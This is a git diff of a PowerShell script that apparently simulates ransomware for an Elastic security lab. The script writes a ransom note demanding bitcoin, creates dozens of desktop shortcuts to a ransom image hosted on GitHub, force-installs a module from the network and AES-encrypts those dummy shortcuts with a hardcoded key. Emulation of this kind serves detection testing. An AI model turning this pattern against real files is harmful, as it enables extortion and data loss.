@@ -56,9 +56,10 @@ OUTEM Polda
 B bitcoin
 ACCEPTED HERE
 Send $300 worth of bitcoin to this address:
-12t9YDPgwueZ9NyMgw519p7AA8isjr6 SMw" > C:\Users\Elastic\Desktop\YOUR_FILES.txt
+12t9YDPgwueZ9NyMgw519p7AA8isjr6 SMw" > C:\Users\Elastic\Desktop\RANSOM_NOTE.txt
 
 # Creation of files 
+Write-Host "[+] Creating File" -ForegroundColor Green
 $TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
 $shortcutFile = "C:\Users\Elastic\Desktop\Ransom.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
@@ -146,7 +147,6 @@ $shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
 $shortcut.TargetPath = $TargetFile
 $shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
 $shortcut.Save()
-
 
 $TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
 $shortcutFile = "C:\Users\Elastic\Desktop\Ransom11.lnk"
@@ -620,95 +620,79 @@ $shortcut.TargetPath = $TargetFile
 $shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
 $shortcut.Save()
 
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom70.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom71.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom72.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom73.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom74.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom75.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom76.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom77.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom78.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom79.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
-
-$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
-$shortcutFile = "C:\Users\Elastic\Desktop\Ransom80.lnk"
-$WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
-$shortcut.TargetPath = $TargetFile
-$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
-$shortcut.Save()
 
 # Encrypt files
-
+Write-Host "[+] Encrypting Files" -ForegroundColor Green
+Install-Module -Name DRTools -Force
+$key = "SWxvdmVyYW5zb213YXJlPDM="
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom1.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom2.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom3.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom4.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom5.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom6.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom7.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom8.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom9.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom10.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom11.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom12.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom13.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom14.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom15.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom16.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom17.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom18.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom19.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom20.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom21.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom22.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom23.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom24.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom25.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom26.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom27.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom28.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom29.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom30.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom31.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom32.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom33.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom34.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom35.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom36.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom37.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom38.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom39.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom40.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom41.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom42.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom43.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom44.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom45.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom46.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom47.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom48.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom49.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom50.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom51.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom52.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom53.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom54.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom55.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom56.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom57.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom58.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom59.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom60.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom61.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom62.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom63.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom64.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom65.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom66.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom67.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom68.lnk
+Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom69.lnk
 
